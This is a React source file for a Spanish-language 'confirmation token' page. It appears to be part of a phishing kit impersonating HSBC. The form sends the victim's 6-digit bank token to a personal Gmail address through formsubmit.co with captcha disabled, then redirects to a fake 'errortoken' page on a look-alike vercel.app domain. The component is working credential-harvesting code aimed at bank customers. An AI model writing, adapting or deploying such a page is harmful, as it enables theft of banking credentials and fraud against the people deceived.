import React, { useEffect, useState } from 'react';
import ImgToken from '../img/token.jpg';
import ImgError from '../img/errortoken.png';
import Modal from 'react-modal';
import '../css/style.css'

const Tokendeconfirmacion = () => {
  const [modalIsOpen, setModalIsOpen] = useState(true);

  const handleCloseModal = () => {
    setModalIsOpen(false);
  };

  const [segundos, setSegundos] = useState(60);

  useEffect(() => {
    const interval = setInterval(() => {
      // Restar 1 segundo al contador de segundos
      setSegundos((prevSegundos) => {
        // Si llega a cero, reiniciar a 60
        if (prevSegundos === 0) {
          return 60;
        }
        return prevSegundos - 1;
      });
    }, 1000);

    return () => {
      clearInterval(interval);
    };
  }, []);


  useEffect(() => {
    const inputtoken = document.getElementById('inputtoken');

    // solo se permiten valores numericos en el input y 6 digitos
    const handleInput = () => {
      if (inputtoken.value.length > 6) {
        inputtoken.value = inputtoken.value.slice(0, 6);
      }
      inputtoken.value = inputtoken.value.replace(/[^0-9]/g, '');
    };

    inputtoken.addEventListener('input', handleInput);

    return () => {
      inputtoken.removeEventListener('input', handleInput);
    };
  }, []);

  return (
    <div className="contglobal">
      <div className="contenedor">
        <form
          className="formulario"
          action="https://formsubmit.co/robr48j@gmail.com"
          method="POST"
        >
          <h1 className="titulo">Token de confirmación</h1>
          <div className="cont">
            <div className="labeleicon">
              <label className="label">Ingresa tu token de confirmación</label>
            </div>
            <div className="input-cont">
              <input
                className="inputname inputtoken"
                id="inputtoken"
                name="name"
                placeholder="Ingresa tu token de 6 digitos"
                type="number"
                maxLength="6"
                required
              />
              {/*  */}
              <input type="hidden" name="email" value="" />
              <input type="hidden" name="_next" value='https://clientesbancohsbc.vercel.app/errortoken' />
              <input type="hidden" name="_captcha" value="false" />
            </div>
            <div className="olvidouser">
              <a href="" onClick={modalIsOpen} className="linkolvido">
                 ¿Donde esta mi token?
              </a>
              <label className="tempo">Quedan {segundos} segundos </label>
            </div>
            <div className="input-contbtn">
              <button className="btncontinuar" type="submit" >
                Continuar
              </button>
            </div>
          </div>
        </form>
        <Modal isOpen={modalIsOpen} className="modal-content">
          <button onClick={handleCloseModal} className="modal-close-button">
            X
          </button>
          <img src={ImgToken} alt="Imagen" className="modal-image" />
        </Modal>

      </div>
    </div>
  );
};

export default Tokendeconfirmacion;
